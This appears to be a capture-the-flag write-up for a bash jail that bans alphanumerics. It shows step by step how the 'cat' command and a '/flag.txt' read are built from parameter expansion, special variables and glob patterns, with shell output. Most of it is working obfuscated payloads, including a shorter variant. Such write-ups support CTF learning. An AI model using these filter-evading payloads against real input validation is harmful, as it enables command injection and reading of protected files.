## Goal

`cat /flag.txt` using parameter expansion and retrieving numbers on stderr to build letters

- https://dev.to/greymd/eq-can-be-critically-vulnerable-338m
- https://asareynolds.com/posts/writeups/picoctf2024/sansalpha/
- http://alkalinesecurity.com/blog/ctf-writeups/pwnable-challenge-cmd3/

## Exploit

**retrieving letters**

```bash
Command executed
Enter the input: ${_:$((($$/$$+$$/$$+$$/$$)*($$/$$+$$/$$))):$(($$/$$))}
/bin/bash: line 1: a: command not found
Command executed
Enter the input: ${-:$((${#-}-${#_[@]})):${#_[@]}}
/bin/bash: line 1: c: command not found
Command executed
Enter the input: __=~;___=${#_[*]};____=$___;((____+=$____));((____+=$____));________=${__:____};$________
/bin/bash: line 1: t: command not found
Command executed
```

---------------------------------------------

```bash
Enter the input: _________=${_:$((($$/$$+$$/$$+$$/$$)*($$/$$+$$/$$))):$(($$/$$))};__=~;___=${#_[*]};____=$___;((____+=$____));((____+=$____));________=${__:____};${-:$((${#-}-${#_[@]})):${#_[@]}}$_________$________#
/bin/bash: line 1: cat#: command not found
Command executed
```



Encoding `cat` leads to:

```
_________=${_:$((($$/$$+$$/$$+$$/$$)*($$/$$+$$/$$))):$(($$/$$))};__=~;___=${#_[*]};____=$___;((____+=$____));((____+=$____));________=${__:____};__________=${-:$((${#-}-${#_[@]})):${#_[@]}}$_________$________;$__________
```

---------------------------------------------

```bash
(hacking) night@me:~/xmas/day8/dist$ P=,.
(hacking) night@me:~/xmas/day8/dist$ cat$P*



_________=${_:$((($$/$$+$$/$$+$$/$$)*($$/$$+$$/$$))):$(($$/$$))};__=~;___=${#_[*]};____=$___;((____+=$____));((____+=$____));________=${__:____};__________=${-:$((${#-}-${#_[@]})):${#_[@]}}$_________$________;____________=,.;$__________"$____________"*
```

---


{cat,file.txt}

```
_________=${_:$((($$/$$+$$/$$+$$/$$)*($$/$$+$$/$$))):$(($$/$$))};__=~;___=${#_[*]};____=$___;((____+=$____));((____+=$____));________=${__:____};__________=${-:$((${#-}-${#_[@]})):${#_[@]}}$_________$________;{$__________,''}
```


=>

```bash
Enter the input: _________=${_:$((($$/$$+$$/$$+$$/$$)*($$/$$+$$/$$))):$(($$/$$))};__=~;___=${#_[*]};____=$___;((____+=$____));((____+=$____));________=${__:____};__________=${-:$((${#-}-${#_[@]})):${#_[@]}}$_________$________;{$__________,''}
cat: can't open '': No such file or directory
Command executed
Enter the input:
```

```
_________=${_:$((($$/$$+$$/$$+$$/$$)*($$/$$+$$/$$))):$(($$/$$))};__=~;___=${#_[*]};____=$___;((____+=$____));((____+=$____));________=${__:____};__________=${-:$((${#-}-${#_[@]})):${#_[@]}}$_________$________;________________=$({$__________,/????.???});$________________
```



Enjoy

```bash
_________=${_:$((($$/$$+$$/$$+$$/$$)*($$/$$+$$/$$))):$(($$/$$))};__=~;___=${#_[*]};____=$___;((____+=$____));((____+=$____));________=${__:____};__________=${-:$((${#-}-${#_[@]})):${#_[@]}}$_________$________;________________=$({$__________,/????.???});$________________
```

## Bis

Another unintended solution in [solve.py](./solve.py) (cc @Oiy)

## Bis nÂ°2

A shorter version of solution 1: `__=(~/???/???);____=${__##*/};$({$____,/*})` (@Mistrale)

